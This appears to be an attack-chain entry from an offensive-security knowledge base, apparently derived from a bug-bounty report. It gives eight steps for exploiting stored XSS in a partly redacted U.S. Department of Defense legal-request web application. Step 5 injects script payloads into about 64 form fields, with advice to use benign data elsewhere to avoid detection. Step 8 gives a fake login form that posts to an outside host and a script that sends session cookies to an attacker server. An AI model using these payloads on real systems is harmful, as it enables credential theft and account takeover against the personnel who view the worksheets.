---
id: ac-stored-xss-dod-worksheet-credential-theft
tags:
  - xss
  - stored-xss
  - credential-theft
  - account-takeover
  - web
  - dod
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Access-DoD-Application-Main-Page]]'
  - '[[procedures/Navigate-to-Worksheet-Creation]]'
  - '[[procedures/Proceed-to-Worksheet-Form]]'
  - '[[procedures/Submit-Initial-Name-Field]]'
  - '[[procedures/Inject-XSS-Payloads-into-Vulnerable-Fields]]'
  - '[[procedures/Submit-Malicious-Worksheet]]'
  - '[[procedures/Trigger-XSS-by-Viewing-Worksheet]]'
  - '[[procedures/Demonstrate-Credential-Theft-Impact]]'
step_count: 8
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:06.217Z'
description: >-
  Multi-stage exploitation of a stored XSS vulnerability in a U.S. Department of
  Defense web application used for legal requests, allowing injection of
  malicious JavaScript into worksheet fields to steal credentials when viewed by
  authorized personnel.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored XSS in DoD Worksheet Form Leading to Credential Theft and Account Takeover

Multi-stage attack chain demonstrating the exploitation of a stored XSS vulnerability in approximately 64 text fields of a U.S. Department of Defense web application for legal requests. The attack involves injecting malicious JavaScript payloads into worksheet forms, which execute when authorized legal personnel view or modify the stored data, enabling credential theft, account takeover, keystroke logging, and drive-by downloads.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 8 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Navigate to Application] --> B[Discovery: Identify Vulnerable Form]
    B --> C[Execution: Inject XSS Payloads]
    C --> D[Persistence: Submit Stored Data]
    D --> E[Impact: Trigger Payload on View/Modify]
    E --> F[Exfiltration: Steal Credentials]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#f39c12
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (e.g., Chrome with developer tools for payload testing)

### Target Environment

- Web application at https://█████ ██████ (DoD legal request portal)
- Required services/ports: HTTPS (443)
- Network access requirements: Internet access to the public-facing DoD site

### Initial Access Requirements

- No credentials required for initial submission (tested as unauthenticated user)
- Authorized personnel viewing the worksheet (for payload execution)
- Network position: External attacker with access to the web app

## Detailed Attack Procedures

### Step 1: Access the Main Page
procedure: [[procedures/Access-DoD-Application-Main-Page]]

**Objective**: Gain initial access to the DoD web application entry point.

**Instructions**: Open a web browser and navigate directly to the main application URL. No authentication is required at this stage for basic access.

**Expected Output**: The main login or landing page of the DoD legal request application loads successfully.

**Success Indicators**:
- Page title or content indicates the DoD application is accessible
- No immediate errors or blocks (e.g., no CAPTCHA or rate limiting)

### Step 2: Navigate to the Worksheet Creation Page
procedure: [[procedures/Navigate-to-Worksheet-Creation]]

**Objective**: Locate and enter the section for creating legal request worksheets.

**Instructions**: From the main page, click on the appropriate link or button labeled `█████████`. Once on the subsequent page, select `███ and ████████` from the available options to proceed to worksheet creation.

**Expected Output**: Redirected to the worksheet creation interface with options to start a new request form.

**Success Indicators**:
- Worksheet creation menu or page is visible
- Navigation completes without errors

### Step 3: Proceed to the Form
procedure: [[procedures/Proceed-to-Worksheet-Form]]

**Objective**: Advance to the detailed input form for the worksheet.

**Instructions**: Click the `Continue` button to load the full form. Fill in any preliminary fields as prompted to reach the text input sections.

**Expected Output**: The multi-field worksheet form loads, including text areas for legal request details.

**Success Indicators**:
- Form fields (including text areas) are editable
- No sanitization warnings during initial input

### Step 4: Submit Initial Name Field
procedure: [[procedures/Submit-Initial-Name-Field]]

**Objective**: Test and submit the initial sanitized field to progress to vulnerable areas.

**Instructions**: Enter a valid name in the initial name field and click `Submit`. Basic XSS payloads (e.g., `<script>alert(1)</script>`) are sanitized here, confirming initial protections but allowing progression.

**Expected Output**: Form advances to subsequent sections with text fields; no alert or execution from initial payload.

**Success Indicators**:
- Form submission succeeds
- Access granted to additional text fields

### Step 5: Inject XSS Payloads into Vulnerable Fields
procedure: [[procedures/Inject-XSS-Payloads-into-Vulnerable-Fields]]

**Objective**: Identify and populate the 64 vulnerable text fields with malicious JavaScript.

**Instructions**: In all subsequent text-accepting fields (approximately 64 total), inject XSS payloads such as `<script>alert('XSS')</script>` or more advanced ones for testing. Complete other required fields with benign data to avoid detection.

**Expected Output**: Form accepts payloads without sanitization errors; fields store the injected HTML/JS.

**Success Indicators**:
- Payloads are entered without rejection
- Form remains submittable

### Step 6: Submit the Form
procedure: [[procedures/Submit-Malicious-Worksheet]]

**Objective**: Persist the injected payloads by submitting the worksheet.

**Instructions**: Review the form and click `Finish` to submit. The system confirms submission and provides a ticket number for the request.

**Expected Output**: Confirmation message with ticket number; worksheet stored in the backend.

**Success Indicators**:
- Submission confirmation displayed
- Ticket number generated for tracking

### Step 7: View or Modify the Worksheet to Trigger XSS
procedure: [[procedures/Trigger-XSS-by-Viewing-Worksheet]]

**Objective**: Execute the stored payload by accessing the worksheet as an authorized user.

**Instructions**: Use the ticket number to return to the `███████` page, enter details in the `█████` area, or click `██████` to view/modify. The payload executes upon rendering the fields.

**Expected Output**: Malicious JavaScript runs in the browser context, e.g., alert popup or form hijacking.

**Success Indicators**:
- JavaScript execution confirmed (e.g., alert fires)
- No CSP or other blocks prevent execution

### Step 8: Demonstrate Impact with Credential Theft Payload
procedure: [[procedures/Demonstrate-Credential-Theft-Impact]]

**Objective**: Show real-world impact like phishing for credentials or cookie exfiltration.

**Instructions**: Use payloads such as: `<h3>Please login to proceed</h3><form action="http://██████"><input type="text" name="username"><input type="password" name="password"><input type="submit" value="Logon"></form>` for phishing, or `<script>window.location="http://███/?cookie=" + document.cookie</script>` for redirection and cookie theft. Test in a controlled environment.

**Expected Output**: Fake login form appears or user redirected with cookies appended to URL.

**Success Indicators**:
- Credentials captured on attacker's server
- Account takeover potential demonstrated

## Attack Chain Summary

### Key Achievements

1. Successful injection and storage of XSS payloads in 64 fields without detection.
2. Execution of arbitrary JavaScript in the context of high-privilege DoD personnel.
3. Demonstration of credential theft and account takeover capabilities.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
